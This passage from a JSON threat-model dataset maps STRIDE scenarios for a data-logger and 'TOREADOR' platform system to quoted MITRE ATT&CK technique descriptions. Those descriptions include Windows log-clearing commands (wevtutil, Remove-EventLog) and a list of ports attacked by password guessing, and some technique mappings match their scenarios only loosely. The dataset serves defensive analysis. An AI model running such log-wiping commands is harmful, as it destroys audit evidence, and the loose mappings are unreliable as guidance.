access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the data logger\u2019s network communication interface, causing a denial of service.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate high volumes of traffic targeted at the data logger.",
                    "Role": "Attacker",
                    "Condition": "Network connectivity achieved."
                },
                {
                    "Assumption": "Data logger\u2019s network interface has insufficient protection against traffic floods.",
                    "Role": "System Architect",
                    "Condition": "Lack of flood protection and rate limiting."
                },
                {
                    "Assumption": "No mitigation techniques such as load balancers or traffic filters are in place.",
                    "Role": "System Architect",
                    "Condition": "Absence of defensive infrastructure."
                }
            ],
            "Potential Impact": "Disruption of data collection and potential loss of critical data.",
            "MITRE ATT&CK Keywords": [
                "Traffic Flooding",
                "Network Interface",
                "Data Logger",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a distributed denial-of-service attack on the TOREADOR platform, rendering it unavailable.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to a botnet or other means to generate massive traffic.",
                    "Role": "Attacker",
                    "Condition": "Botnet compromised or rented."
                },
                {
                    "Assumption": "TOREADOR platform lacks robust DDoS mitigation measures.",
                    "Role": "System Architect",
                    "Condition": "Inadequate DDoS protections."
                },
                {
                    "Assumption": "Critical services on the TOREADOR platform are accessible directly over the internet.",
                    "Role": "System Architect",
                    "Condition": "Lack of network segmentation."
                }
            ],
            "Potential Impact": "Disruption of predictive maintenance and power optimization functions.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Botnet",
                "Cloud Platform",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a known vulnerability in the receiver component to crash it and disrupt data flow.",
            "Assumptions": [
                {
                    "Assumption": "The receiver component has a known vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability identified and targeted."
                },
                {
                    "Assumption": "The vulnerable receiver service is internet-facing.",
                    "Role": "System Architect",
                    "Condition": "Service exposed to public internet."
                },
                {
                    "Assumption": "No patch or mitigation has been applied to the vulnerable service.",
                    "Role": "System Operator",
                    "Condition": "Vulnerability unpatched due to oversight or delay."
                }
            ],
            "Potential Impact": "Interruption of data receipts from the data logger, causing loss of real-time monitoring and predictive capabilities.",
            "MITRE ATT&CK Keywords": [
                "Vulnerability Exploitation",
                "Service Crash",
                "Receiver Component",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability on the data logger to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "The data logger has a known, exploitable vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability identified and exploited."
                },
                {
                    "Assumption": "The attacker can communicate with the data logger over the network.",
                    "Role": "Attacker",
                    "Condition": "Network access achieved."
                },
                {
                    "Assumption": "Insufficient hardening and patching of the data logger.",
                    "Role": "System Architect",
                    "Condition": "Patches and security updates not applied."
                }
            ],
            "Potential Impact": "Full control over the data logger, allowing for widespread tampering with collected data.",
            "MITRE ATT&CK Keywords": [
                "Vulnerability Exploitation",
                "Root Access",
                "Data Logger",
                "Elevation of Privilege"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses compromised credentials to escalate privileges on the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has stolen valid user credentials.",
                    "Role": "Attacker",
                    "Condition": "Credentials obtained through phishing or keylogging."
                },
                {
                    "Assumption": "Insufficient monitoring and response to suspicious activities.",
                    "Role": "System Architect",
                    "Condition": "Anomalous behavior not detected or ignored."
                },
                {
                    "Assumption": "Lack of multi-factor authentication for critical operations.",
                    "Role": "System Architect",
                    "Condition": "MFA not implemented or misconfigured."
                }
            ],
            "Potential Impact": "Unauthorized actions on the platform, including changes to AI/ML models and data access.",
            "MITRE ATT&CK Keywords": [
                "Credential Compromise",
                "Privilege Escalation",
                "TOREADOR Platform",
                "Elevation of Privilege"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the dashboard software to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The dashboard software contains a zero-day vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Vulnerability undisclosed and exploited."
                },
                {
                    "Assumption": "The attacker can access the dashboard over the network.",
                    "Role": "Attacker",
                    "Condition": "Network access achieved."
                },
                {
                    "Assumption": "Lack of intrusion detection systems monitoring the dashboard.",
                    "Role": "System Architect",
                    "Condition": "IDS not implemented or bypassed."
                }
            ],
            "Potential Impact": "Complete control over the dashboard functionality, allowing unauthorized data manipulation and access.",
            "MITRE ATT&CK Keywords": [
                "Zero-Day",
                "Administrative Access",
                "Dashboard Exploit",
                "Elevation of Privilege"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Dashboard by impersonating a legitimate employee.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to some form of employee credentials (e.g., phishing, social engineering).",
                    "Role": "Attacker",
                    "Condition": "Credential compromise."
                },
                {
                    "Assumption": "The Dashboard lacks multi-factor authentication (MFA).",
                    "Role": "System",
                    "Condition": "Authentication mechanism is weak."
                },
                {
                    "Assumption": "Employees use weak passwords or have similar patterns.",
                    "Role": "Employees",
                    "Condition": "Weak password practices."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive predictions and operational data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "authentication",
                "phishing",
                "credentials"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary impersonates a Data Logger to inject false sensor data into the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can mimic the Data Logger's network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network impersonation."
                },
                {
                    "Assumption": "The integrity check mechanisms can be bypassed or are inadequate.",
                    "Role": "System",
                    "Condition": "Weak data validation."
                },
                {
                    "Assumption": "Network communication is not encrypted or uses weak encryption.",
                    "Role": "System",
                    "Condition": "Weak network security."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to false predictions and operational decisions.",
            "MITRE ATT&CK Keywords": [
                "network",
                "injection",
                "spoofing",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised anonymity agent to access pre-processed data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised the anonymity agent module.",
                    "Role": "Attacker",
                    "Condition": "Module compromise."
                },
                {
                    "Assumption": "The data flow between the anonymity agent and the TOREADOR platform is not securely authenticated.",
                    "Role": "System",
                    "Condition": "Weak authentication between modules."
                },
                {
                    "Assumption": "The attacker has knowledge of the system's data handling process.",
                    "Role": "Attacker",
                    "Condition": "Insider knowledge or reconnaissance."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data leading to potential information leaks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "compromise",
                "data",
                "module"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the data collected by sensors before it reaches the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The data transmission between sensors and Data Loggers is not encrypted.",
                    "Role": "System",
                    "Condition": "Unencrypted communication."
                },
                {
                    "Assumption": "Physical access to sensors or their transmission paths is possible for the attacker.",
                    "Role": "Attacker",
                    "Condition": "Physical presence or access."
                },
                {
                    "Assumption": "There is no additional data integrity check in place beyond the sensors.",
                    "Role": "System",
                    "Condition": "Lack of redundancy in data validation."
                }
            ],
            "Potential Impact": "Corrupted sensor data compromising the accuracy of AI/ML model predictions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "physical access",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary modifies the AI/ML models stored on the TOREADOR platform to produce incorrect predictions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains administrative access to the TOREADOR platform.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation or credential compromise."
                },
                {
                    "Assumption": "Model integrity verification techniques are weak or non-existent.",
                    "Role": "System",
                    "Condition": "Weak security measures for model integrity."
                },
                {
                    "Assumption": "The attacker has sufficient knowledge to alter the machine learning models.",
                    "Role": "Attacker",
                    "Condition": "Technical expertise in AI/ML."
                }
            ],
            "Potential Impact": "Incorrect maintenance and power flow optimization decisions leading to operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "model integrity",
                "platform",
                "attacker access"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the data pre-processing steps performed by the Anonymity (Anon) Agent.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient security controls around the Anonymity Agent.",
                    "Role": "System",
                    "Condition": "Weak access controls or system hardening."
                },
                {
                    "Assumption": "The attacker can inject malicious scripts or commands into the processing pipeline.",
                    "Role": "Attacker",
                    "Condition": "Script injection vulnerability."
                },
                {
                    "Assumption": "Lack of monitoring and anomaly detection for data pre-processing.",
                    "Role": "System",
                    "Condition": "Weak monitoring practices."
                }
            ],
            "Potential Impact": "Manipulated data leading to misinformed AI/ML model training.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data preprocessing",
                "script injection",
                "anonymity agent"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Legitimate users deny having made changes to the AI/ML model configurations.",
            "Assumptions": [
                {
                    "Assumption": "System lacks effective logging mechanisms.",
                    "Role": "System",
                    "Condition": "Inadequate audit logs."
                },
                {
                    "Assumption": "Logs can be altered or deleted by users with sufficient privileges.",
                    "Role": "Administrator",
                    "Condition": "Weak log integrity controls."
                },
                {
                    "Assumption": "There is no multi-factor authentication (MFA) in place for administrative actions.",
                    "Role": "System",
                    "Condition": "Weak access control policies."
                }
            ],
            "Potential Impact": "Difficulty in tracing the source of configuration changes leading to potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit",
                "access control"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An adversary alters event logs to hide malicious activities related to data manipulation.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has administrative privileges or exploits a vulnerability to gain them.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation."
                },
                {
                    "Assumption": "Event logs are stored in an unprotected or easily accessible location.",
                    "Role": "System",
                    "Condition": "Weak log storage security."
                },
                {
                    "Assumption": "The system lacks immutable logging mechanisms or tamper-evident logs.",
                    "Role": "System",
                    "Condition": "Lack of log integrity protections."
                }
            ],
            "Potential Impact": "Loss of traceability and accountability, hiding the scope and nature of the attack.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "administrative access",
                "traceability"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
